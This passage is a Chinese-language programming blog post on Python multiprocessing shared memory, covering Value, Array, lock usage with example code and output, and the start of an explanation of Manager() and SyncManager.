        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-28/1601302980292-10305.png" alt="10305"></p><h2 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h2><h3 id="1-内存共享"><a href="#1-内存共享" class="headerlink" title="1.内存共享"></a>1.内存共享</h3><blockquote><p>如上所述，在进行并发编程时，通常最好尽可能避免使用共享状态。使用多个进程时尤其如此。但是，如果你确实需要使用一些共享数据，那么 <a href="https://docs.python.org/3/library/multiprocessing.html#module-multiprocessing" target="_blank" rel="noopener"><code>multiprocessing</code></a>提供了一些方法.</p><p>在多进程的情况下,每个进程都有自己独立的内存空间,<code>multiprocessing</code> 提供了<code>Value,Array</code> 两个函数来共享内存(定义在<code>sharedctypes.py</code>)</p></blockquote><h4 id="Vaule"><a href="#Vaule" class="headerlink" title="Vaule"></a><code>Vaule</code></h4><blockquote><p>定义:</p><pre class="line-numbers language-python">multiprocessing.Value(typecode_or_type, *args, lock=True)</code></pre><p>返回从共享内存中分配的一个<code>ctypes</code>对象,其中<code>typecode_or_type</code>定义了返回的类型。它要么是一个<code>ctypes</code>类型，要么是一个代表<code>ctypes</code>类型的<code>code</code>。ctypes是Python的一个外部函数库，它提供了和C语言兼任的数据类型，可以调用DLLs或者共享库的函数，能被用作在python中包裹这些库。</p><p><code>*args</code> 是传递给ctypes的构造函数:</p><p>对于共享<strong>整数</strong>或者<strong>单个字符</strong> 映射关系为:</p><table><thead><tr><th>Type Code</th><th>C Type</th><th>Python Type</th></tr></thead><tbody><tr><td>‘c’</td><td>char</td><td>character</td></tr><tr><td>‘b’</td><td>signed char</td><td>int</td></tr><tr><td>‘B’</td><td>unsigned char</td><td>int</td></tr><tr><td>‘u’</td><td>Py_UNICODE</td><td>unicode character</td></tr><tr><td>‘h’</td><td>signed short</td><td>int</td></tr><tr><td>‘H’</td><td>unsigned short</td><td>int</td></tr><tr><td>‘i’</td><td>signed int</td><td>int</td></tr><tr><td>‘I’</td><td>unsigned int</td><td>int</td></tr><tr><td>‘l’</td><td>signed long</td><td>int</td></tr><tr><td>‘L’</td><td>unsigned long</td><td>int</td></tr><tr><td>‘f’</td><td>float</td><td>float</td></tr><tr><td>‘d’</td><td>double</td><td>float</td></tr></tbody></table><h4 id="比如整数1-可以表示为-Value-39-h-39-1"><a href="#比如整数1-可以表示为-Value-39-h-39-1" class="headerlink" title="比如整数1 ,可以表示为:Value(&#39;h&#39;, 1)"></a>比如整数1 ,可以表示为:<code>Value(&#39;h&#39;, 1)</code></h4><p>如果共享的是字符串,没有对应的<code>Type code</code> ,可以使用原始的<code>ctype</code> 类型:</p><table><thead><tr><th><strong>ctypes type</strong></th><th><strong>C type</strong></th><th><strong>Python type</strong></th></tr></thead><tbody><tr><td>c_bool</td><td>_Bool</td><td>bool (1)</td></tr><tr><td>char</td><td>char</td><td>1-character string</td></tr><tr><td>c_wchar</td><td>wchar_t</td><td>1-character unicode string</td></tr><tr><td>c_byte</td><td>char</td><td>int/long</td></tr><tr><td>c_ubyte</td><td>unsigned char</td><td>int/long</td></tr><tr><td>c_short</td><td>short</td><td>int/long</td></tr><tr><td>c_ushort</td><td>unsigned short</td><td>int/long</td></tr><tr><td>c_int</td><td>int</td><td>int/long</td></tr><tr><td>c_uint</td><td>unsigned in</td><td>int/long</td></tr><tr><td>c_long</td><td>long</td><td>int/long</td></tr><tr><td>c_ulong</td><td>unsigned long</td><td>int/long</td></tr><tr><td>c_longlong</td><td>__int64 or long long</td><td>int/long</td></tr><tr><td>c_ulonglong</td><td>unsigned __int64 or unsigned long long</td><td>int/long</td></tr><tr><td>c_float</td><td>float</td><td>float</td></tr><tr><td>c_double</td><td>double</td><td>float</td></tr><tr><td>c_longdouble</td><td>long double</td><td>float</td></tr><tr><td>c_char_p</td><td>char * (NUL terminated)</td><td>string or None</td></tr><tr><td>c_wchar_p</td><td>wchar_t * (NUL terminated)</td><td>unicode or None</td></tr><tr><td>c_void_p</td><td>void *</td><td>int/long or None</td></tr></tbody></table><p>比如上面的<code>Value(&#39;h&#39;, 1)</code> 也可以用<code>Value(c_short, 1)</code> ,字符串可以用<code>Value(c_char_p, &#39;python&#39;)</code> 来表示.</p><p>返回的对象基于<code>SynchronizedBase</code> 类,定义如下</p><pre><code class="python"><code class="language-python">multiprocessing.Value(typecode_or_type, *args, lock=True)</code></pre><p>返回从共享内存中分配的一个<code>ctypes</code>对象,其中<code>typecode_or_type</code>定义了返回的类型。它要么是一个<code>ctypes</code>类型，要么是一个代表<code>ctypes</code>类型的<code>code</code>。ctypes是Python的一个外部函数库，它提供了和C语言兼任的数据类型，可以调用DLLs或者共享库的函数，能被用作在python中包裹这些库。</p><p><code>*args</code> 是传递给ctypes的构造函数:</p><p>对于共享<strong>整数</strong>或者<strong>单个字符</strong> 映射关系为:</p><table><thead><tr><th>Type Code</th><th>C Type</th><th>Python Type</th></tr></thead><tbody><tr><td>‘c’</td><td>char</td><td>character</td></tr><tr><td>‘b’</td><td>signed char</td><td>int</td></tr><tr><td>‘B’</td><td>unsigned char</td><td>int</td></tr><tr><td>‘u’</td><td>Py_UNICODE</td><td>unicode character</td></tr><tr><td>‘h’</td><td>signed short</td><td>int</td></tr><tr><td>‘H’</td><td>unsigned short</td><td>int</td></tr><tr><td>‘i’</td><td>signed int</td><td>int</td></tr><tr><td>‘I’</td><td>unsigned int</td><td>int</td></tr><tr><td>‘l’</td><td>signed long</td><td>int</td></tr><tr><td>‘L’</td><td>unsigned long</td><td>int</td></tr><tr><td>‘f’</td><td>float</td><td>float</td></tr><tr><td>‘d’</td><td>double</td><td>float</td></tr></tbody></table><h4 id="比如整数1-可以表示为-Value-39-h-39-1"><a href="#比如整数1-可以表示为-Value-39-h-39-1" class="headerlink" title="比如整数1 ,可以表示为:Value(&#39;h&#39;, 1)"></a>比如整数1 ,可以表示为:<code>Value(&#39;h&#39;, 1)</code></h4><p>如果共享的是字符串,没有对应的<code>Type code</code> ,可以使用原始的<code>ctype</code> 类型:</p><table><thead><tr><th><strong>ctypes type</strong></th><th><strong>C type</strong></th><th><strong>Python type</strong></th></tr></thead><tbody><tr><td>c_bool</td><td>_Bool</td><td>bool (1)</td></tr><tr><td>char</td><td>char</td><td>1-character string</td></tr><tr><td>c_wchar</td><td>wchar_t</td><td>1-character unicode string</td></tr><tr><td>c_byte</td><td>char</td><td>int/long</td></tr><tr><td>c_ubyte</td><td>unsigned char</td><td>int/long</td></tr><tr><td>c_short</td><td>short</td><td>int/long</td></tr><tr><td>c_ushort</td><td>unsigned short</td><td>int/long</td></tr><tr><td>c_int</td><td>int</td><td>int/long</td></tr><tr><td>c_uint</td><td>unsigned in</td><td>int/long</td></tr><tr><td>c_long</td><td>long</td><td>int/long</td></tr><tr><td>c_ulong</td><td>unsigned long</td><td>int/long</td></tr><tr><td>c_longlong</td><td>__int64 or long long</td><td>int/long</td></tr><tr><td>c_ulonglong</td><td>unsigned __int64 or unsigned long long</td><td>int/long</td></tr><tr><td>c_float</td><td>float</td><td>float</td></tr><tr><td>c_double</td><td>double</td><td>float</td></tr><tr><td>c_longdouble</td><td>long double</td><td>float</td></tr><tr><td>c_char_p</td><td>char * (NUL terminated)</td><td>string or None</td></tr><tr><td>c_wchar_p</td><td>wchar_t * (NUL terminated)</td><td>unicode or None</td></tr><tr><td>c_void_p</td><td>void *</td><td>int/long or None</td></tr></tbody></table><p>比如上面的<code>Value(&#39;h&#39;, 1)</code> 也可以用<code>Value(c_short, 1)</code> ,字符串可以用<code>Value(c_char_p, &#39;python&#39;)</code> 来表示.</p><p>返回的对象基于<code>SynchronizedBase</code> 类,定义如下</p><pre><code class="python">class SynchronizedBase(object): def __init__(self, obj, lock=None):     self._obj = obj     self._lock = lock or RLock()     self.acquire = self._lock.acquire     self.release = self._lock.release def __reduce__(self):     assert_spawning(self)     return synchronized, (self._obj, self._lock) def get_obj(self):     return self._obj def get_lock(self):     return self._lock def __repr__(self):     return '<%s wrapper for %s>' % (type(self).__name__, self._obj)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>具有的属性和方法有:</p><ul><li><code>value</code> : 获取值</li><li><code>get_lock()</code> : 获取锁对象</li><li><code>acquire/release</code> :获取锁,释放锁</li></ul><p>举例:</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/evn python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token keyword">import</span> time<span class="token keyword">import</span> multiprocessing<span class="token keyword">def</span> <span class="token function">fun</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>        val<span class="token punctuation">.</span>value <span class="token operator">+=</span> <span class="token number">1</span>v <span class="token operator">=</span> multiprocessing<span class="token punctuation">.</span>Value<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>p_list <span class="token operator">=</span> <span class="token punctuation">[</span>multiprocessing<span class="token punctuation">.</span>Process<span class="token punctuation">(</span>target<span class="token operator">=</span>fun<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> p <span class="token keyword">in</span> p_list<span class="token punctuation">:</span>    p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> p <span class="token keyword">in</span> p_list<span class="token punctuation">:</span>    p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>v<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上述代码是多个进程修改v值，我们期待它输出的是100，但是实际上并输出的并不是100，Value的构造函数默认的lock是True，它会创建一个锁对象用于同步访问控制，这就容易造成一个错误的意识，认为Value在多进程中是安全的，但实际上并不是，要想真正的控制同步访问，需要实现获取这个锁。所以需要修改fun()函数。如下：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fun</span><span class="token punctuation">(</span>val<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> val<span class="token punctuation">.</span>get_lock<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 必须获取锁</span>            val<span class="token punctuation">.</span>value <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="Array"><a href="#Array" class="headerlink" title="Array"></a><code>Array</code></h4><blockquote><p>定义:</p><p><code>multiprocessing.Array(*typecode_or_type*, *size_or_initializer*, ***, *lock=True*)</code></p><p>返回的是一个从共享内存分配的ctypes数组.</p><ul><li><code>typecode_or_type</code> :确定返回数组的元素的类型：它是一个ctypes类型或一个字符类型代码类型的<strong>数组</strong>模块使用的类型</li><li><code>size_or_initializer</code>:如果它是一个整数，那么它确定数组的长度，并且数组将被初始化为零。否则，size_or_initializer是用于初始化数组的序列，其长度决定数组的长度</li><li>如果关键字参数中有lock的话，lock为True，则会创建一个新的锁对象，以同步对该值的访问。如果lock是Lock或RLock对象，那么它将用于同步对该值的访问。如果lock是False，那么对返回的对象的访问不会被锁自动保护，因此它不一定是“进程安全的”</li></ul></blockquote><h3 id="Value-Array实例"><a href="#Value-Array实例" class="headerlink" title="Value,Array实例"></a>Value,Array实例</h3><blockquote><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># coding=utf-8</span><span class="token triple-quoted-string string">"""使用数组的方式共享内存和全局对象Value: 返回一个从共享内存中分配的对象 Value.value : 得到Value中Ctype的值 Value.get_lock: 获取 Value中的锁对象 Vlaue.acquie/release 上锁/释放锁Array: 返回一个从共享内存中分配的数组"""</span><span class="token keyword">import</span> os<span class="token keyword">from</span> multiprocessing <span class="token keyword">import</span> Process<span class="token punctuation">,</span> Array<span class="token punctuation">,</span> Valueprocs <span class="token operator">=</span> <span class="token number">3</span>count <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">showdate</span><span class="token punctuation">(</span>label<span class="token punctuation">,</span> val<span class="token punctuation">,</span> arr<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">""" 在这个进程中打印数据值 """</span> msg <span class="token operator">=</span> <span class="token string">'%-12s:pid:%4s, global:%s,value:%s,array:%s'</span> <span class="token keyword">print</span><span class="token punctuation">(</span>msg <span class="token operator">%</span> <span class="token punctuation">(</span>label<span class="token punctuation">,</span> os<span class="token punctuation">.</span>getpid<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> count<span class="token punctuation">,</span> val<span class="token punctuation">.</span>value<span class="token punctuation">,</span> list<span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">updater</span><span class="token punctuation">(</span>val<span class="token punctuation">,</span> arr<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">"""通过共享内存进行通信"""</span> <span class="token keyword">global</span> count count <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment" spellcheck="true"># 全局的基数器,非共享的</span> <span class="token comment" spellcheck="true"># 传入的数据Value,Array是共享的</span> val<span class="token punctuation">.</span>value <span class="token operator">+=</span> <span class="token number">1</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">""" Value, Array 返回的是一个内存中共享的Ctype对象 i --> sigint --> int d ---> float, porcs 整数,确定了数组的长度,并且被初始化为 0 因为这里是浮点类型,被初始化为0.0 """</span> scalar <span class="token operator">=</span> Value<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> vector <span class="token operator">=</span> Array<span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">,</span> procs<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 在父进程中显示起始值</span> showdate<span class="token punctuation">(</span><span class="token string">'parent start'</span><span class="token punctuation">,</span> scalar<span class="token punctuation">,</span> vector<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 派生子进程, 传入共享内存</span> p <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>showdate<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'child'</span><span class="token punctuation">,</span> scalar<span class="token punctuation">,</span> vector<span class="token punctuation">)</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 传入父进程中跟新过的共享内存,等待每次传入结束</span> <span class="token comment" spellcheck="true"># 每个子进程看到了父进程中到现在为止对args的跟新(但是全局变量看不到)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nloop1(updates in parent, serial children)....'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>procs<span class="token punctuation">)</span><span class="token punctuation">:</span>     count <span class="token operator">+=</span> <span class="token number">1</span>     scalar<span class="token punctuation">.</span>value <span class="token operator">+=</span> <span class="token number">1</span>     vector<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment" spellcheck="true"># 数组中的每个元素加1</span>     p <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>showdate<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>         <span class="token punctuation">(</span><span class="token string">'porcess %s '</span> <span class="token operator">%</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> scalar<span class="token punctuation">,</span> vector<span class="token punctuation">)</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 同上,不过允许子进程单行运行</span> <span class="token comment" spellcheck="true"># 所有进程都看到了最近一次的迭代结果,因为他们都共享这个对象</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nloop2(updates in parent, serial children)....'</span><span class="token punctuation">)</span> ps <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>procs<span class="token punctuation">)</span><span class="token punctuation">:</span>     count <span class="token operator">+=</span> <span class="token number">1</span>     scalar<span class="token punctuation">.</span>value <span class="token operator">+=</span> <span class="token number">1</span>     vector<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">1</span>     p <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>showdate<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>         <span class="token punctuation">(</span><span class="token string">'porcess %s '</span> <span class="token operator">%</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> scalar<span class="token punctuation">,</span> vector<span class="token punctuation">)</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>     ps<span class="token punctuation">.</span>append<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token keyword">for</span> p <span class="token keyword">in</span> ps<span class="token punctuation">:</span>     p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 共享内存在派生子进程中进行跟新,等待每个跟新结束</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nloop3(updates in parent, serial children)....'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>procs<span class="token punctuation">)</span><span class="token punctuation">:</span>     p <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>updater<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>scalar<span class="token punctuation">,</span> vector<span class="token punctuation">)</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span> showdate<span class="token punctuation">(</span><span class="token string">'parent temp'</span><span class="token punctuation">,</span> scalar<span class="token punctuation">,</span> vector<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 同上, 不过允许子进程并行的进行更新</span> ps <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nloop4(updates in parent, serial children)....'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>procs<span class="token punctuation">)</span><span class="token punctuation">:</span>     p <span class="token operator">=</span> Process<span class="token punctuation">(</span>target<span class="token operator">=</span>updater<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>scalar<span class="token punctuation">,</span> vector<span class="token punctuation">)</span><span class="token punctuation">)</span>     p<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>     ps<span class="token punctuation">.</span>append<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token keyword">for</span> p <span class="token keyword">in</span> ps<span class="token punctuation">:</span>     p<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 仅在父进程中全局变量count = 6</span> <span class="token comment" spellcheck="true"># 在此显示最终的结果</span> showdate<span class="token punctuation">(</span><span class="token string">'parent end'</span><span class="token punctuation">,</span> scalar<span class="token punctuation">,</span> vector<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显示结果:—-&gt; 理解这一个实例就够了</p><pre class="line-numbers language-bash"><code class="language-bash">parent start:pid:27891, global:0,value:0,array:<span class="token punctuation">[</span>0.0, 0.0, 0.0<span class="token punctuation">]</span>child       :pid:27892, global:0,value:0,array:<span class="token punctuation">[</span>0.0, 0.0, 0.0<span class="token punctuation">]</span>loop1<span class="token punctuation">(</span>updates <span class="token keyword">in</span> parent, serial children<span class="token punctuation">)</span><span class="token punctuation">..</span><span class="token punctuation">..</span>porcess 0   :pid:27893, global:1,value:1,array:<span class="token punctuation">[</span>1.0, 0.0, 0.0<span class="token punctuation">]</span>porcess 1   :pid:27894, global:2,value:2,array:<span class="token punctuation">[</span>1.0, 1.0, 0.0<span class="token punctuation">]</span>porcess 2   :pid:27895, global:3,value:3,array:<span class="token punctuation">[</span>1.0, 1.0, 1.0<span class="token punctuation">]</span>loop2<span class="token punctuation">(</span>updates <span class="token keyword">in</span> parent, serial children<span class="token punctuation">)</span><span class="token punctuation">..</span><span class="token punctuation">..</span>porcess 0   :pid:27896, global:4,value:6,array:<span class="token punctuation">[</span>2.0, 2.0, 2.0<span class="token punctuation">]</span>porcess 1   :pid:27897, global:5,value:6,array:<span class="token punctuation">[</span>2.0, 2.0, 2.0<span class="token punctuation">]</span>porcess 2   :pid:27898, global:6,value:6,array:<span class="token punctuation">[</span>2.0, 2.0, 2.0<span class="token punctuation">]</span>loop3<span class="token punctuation">(</span>updates <span class="token keyword">in</span> parent, serial children<span class="token punctuation">)</span><span class="token punctuation">..</span><span class="token punctuation">..</span>parent temp :pid:27891, global:6,value:9,array:<span class="token punctuation">[</span>5.0, 5.0, 5.0<span class="token punctuation">]</span>loop4<span class="token punctuation">(</span>updates <span class="token keyword">in</span> parent, serial children<span class="token punctuation">)</span><span class="token punctuation">..</span><span class="token punctuation">..</span>parent end  :pid:27891, global:6,value:12,array:<span class="token punctuation">[</span>8.0, 8.0, 8.0<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="2-再看Manger"><a href="#2-再看Manger" class="headerlink" title="2.再看Manger()"></a>2.再看<code>Manger()</code></h3><blockquote><p>通过<code>Manager()</code>返回的一个<code>manager</code>对象控制一个服务器进程，它保持住<code>Python</code>对象并允许其它进程使用代理操作它们。同时它用起来很方便，而且支持本地和远程内存共享.</p><p><code>Manager()</code>返回的<code>manager</code>支持的类型有<code>list,dict,Namespace,Lock,RLock,Semaphore,BoundedSemaphore,Condition,Event, Queue, Value和Array</code>。定义在<code>manager.py</code>文件里.</p><p>manager的定义很简单如下</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">Manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token triple-quoted-string string">''' Returns a manager associated with a running server process The managers methods such as `Lock()`, `Condition()` and `Queue()` can be used to create shared objects. '''</span> <span class="token keyword">from</span> multiprocessing<span class="token punctuation">.</span>managers <span class="token keyword">import</span> SyncManager m <span class="token operator">=</span> SyncManager<span class="token punctuation">(</span><span class="token punctuation">)</span> m<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">return</span> m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Manager()</code>返回一个已经启动的SyncManager对象，管理器进程将在垃圾收集或其父进程退出时立即关闭。SyncManager继承自BaseManager。BaseManager的定义也在managers.py文件里，初始化如下：<code>BaseManager([address[, authkey]])</code></p><ul><li><code>address</code> : 是管理器进程侦听新连接的地址。 如果地址是无，则选择任意一个</li><li><code>authkey</code>:是将用于检查到服务器进程的传入连接的有效性的认证密钥。 如果authkey是None，那么使用当前进程current_process()的authkey； 否则使用的authkey，它必须是字符串</li></ul><p><code>BaseManager</code> 对象的方法和属性有:</p><ul><li><code>start([initializer [, initargs]])</code>:启动子过程以启动管理器。 如果初始化程序不是None，那么子程序在启动时会调用initializer(*initargs)为此管理器对象生成一个服务器进程</li><li><code>get_server()</code> : 返回一个Server对象，它表示在Manager控制下的实际服务器</li><li><code>connect()</code>: 将本地管理器对象连接到远程管理器进程</li><li><code>shutdown()</code>:停止管理器在使用的进程,这仅在用<code>start()</code>已启动服务器进程时使用,可以被多次调用</li><li><code>register(typeid [，callable [，proxytype [，exposed [，method_to_typeid [，create_method]]]]])</code>:可以用于向管理器类注册类型或可调用的类方法</li><li><code>typeid</code>: 用于标识特定类型的共享对象的“类型标识符”。这必须是字符串</li><li><code>callable</code>:用于为该类型标识符创建可调用的对象。如果将使用from_address（）类方法创建管理器实例，或者如果create_method参数为False，那么这可以保留为None</li><li><code>method_to_typeid</code> :一个映射，用于指定返回代理的那些公开方法的返回类型。它将方法名映射到typeid字符串</li><li><code>create_method</code> :确定是否应该使用名称typeid创建一个方法，该方法可以用于告诉服务器进程创建一个新的共享对象并为其返回一个代理。默认情况下为True</li><li><strong>address：</strong>管理器使用的地址</li><li>join(timeout=None)：阻塞</li></ul><p>现在可以来看看，SyncManager类的定义了</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">SyncManager</span><span class="token punctuation">(</span>BaseManager<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''    Subclass of `BaseManager` which supports a number of shared object types.    The types registered are those intended for the synchronization    of threads, plus `dict`, `list` and `Namespace`.    The `multiprocessing.Manager()` function creates started instances of    this class.    '''</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'Queue'</span><span class="token punctuation">,</span> queue<span class="token punctuation">.</span>Queue<span class="token punctuation">)</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'JoinableQueue'</span><span class="token punctuation">,</span> queue<span class="token punctuation">.</span>Queue<span class="token punctuation">)</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'Event'</span><span class="token punctuation">,</span> threading<span class="token punctuation">.</span>Event<span class="token punctuation">,</span> EventProxy<span class="token punctuation">)</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'Lock'</span><span class="token punctuation">,</span> threading<span class="token punctuation">.</span>Lock<span class="token punctuation">,</span> AcquirerProxy<span class="token punctuation">)</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'RLock'</span><span class="token punctuation">,</span> threading<span class="token punctuation">.</span>RLock<span class="token punctuation">,</span> AcquirerProxy<span class="token punctuation">)</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'Semaphore'</span><span class="token punctuation">,</span> threading<span class="token punctuation">.</span>Semaphore<span class="token punctuation">,</span> AcquirerProxy<span class="token punctuation">)</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'BoundedSemaphore'</span><span class="token punctuation">,</span> threading<span class="token punctuation">.</span>BoundedSemaphore<span class="token punctuation">,</span>                     AcquirerProxy<span class="token punctuation">)</span>SyncManager<span class="token punctuation">.</span>register<span class="token punctuation">(</span><span class="token string">'Condition'</span><span class="token punctuation">,</span> threading<span class="token punctuation">.</span>Condition<span class="token punctuation">,</span> ConditionProxy<span class="token 